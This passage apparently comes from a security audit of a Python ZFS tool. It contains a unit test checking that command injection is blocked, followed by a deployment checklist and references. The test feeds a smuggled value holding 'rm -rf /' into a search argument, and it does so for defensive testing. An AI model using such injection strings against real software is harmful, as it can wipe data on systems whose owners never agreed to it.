def test_command_injection_prevention():
    """Test command injection is prevented"""
    # Verify commands executed as lists, not strings
    with mock.patch('subprocess.Popen') as mock_popen:
        zfs.find("test'; rm -rf /; echo '")
        # Verify Popen called with list args, not shell string
```

---

## Deployment Checklist

- [ ] All CRITICAL vulnerabilities fixed
- [ ] Code review by security team
- [ ] Penetration testing completed
- [ ] Configuration files have secure permissions (600)
- [ ] SSH keys have secure permissions (600)
- [ ] Logging doesn't expose sensitive paths
- [ ] Host key verification enabled
- [ ] Error handling sanitizes messages
- [ ] Input validation comprehensive
- [ ] Tests cover security scenarios
- [ ] Documentation updated with security guidelines
- [ ] Deployment guide includes permission setup

---

## References

- OWASP Top 10: https://owasp.org/Top10/
- CWE (Common Weakness Enumeration): https://cwe.mitre.org/
- OpenSSH Security: https://man.openbsd.org/ssh_config
- ZFS Security: https://docs.oracle.com/en/operating-systems/oracle-solaris/solaris-ostad/
- Python Security: https://python-guide.readthedocs.io/en/latest/notes/security/

---

## Document Information

**Created:** 2026-06-24  
**Last Updated:** 2026-06-24  
**Status:** Initial Security Audit  
**Classification:** Security-Sensitive

*This document contains sensitive security information and should be treated as confidential.*
